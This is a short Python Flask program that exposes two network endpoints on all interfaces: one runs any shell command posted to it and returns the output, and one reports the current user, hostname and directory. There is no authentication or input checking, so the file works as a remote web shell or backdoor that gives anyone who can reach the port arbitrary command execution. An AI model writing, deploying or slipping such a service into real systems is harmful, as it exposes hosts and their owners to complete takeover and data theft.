from flask import Flask, request, jsonify
import subprocess
import os
import socket
import pwd

app = Flask(__name__)

# Endpoint to execute commands
@app.route('/execute', methods=['POST'])
def execute_command():
    try:
        data = request.get_json()
        command = data.get("command")
        if not command:
            return jsonify({"error": "No command provided"}), 400

        # Execute the command
        result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        return jsonify({"output": result.stdout, "error": result.stderr if result.stderr else None}), 200

    except Exception as e:
        return jsonify({"error": str(e)}), 500

# Endpoint to get user, host, and current directory
@app.route('/info', methods=['GET'])
def get_user_info():
    try:
        user = pwd.getpwuid(os.getuid()).pw_name  # Get current user
        host = socket.gethostname()              # Get host name
        cwd = os.getcwd()                        # Get current directory
        return jsonify({"user": user, "host": host, "cwd": cwd}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)  # Expose the API on port 5000
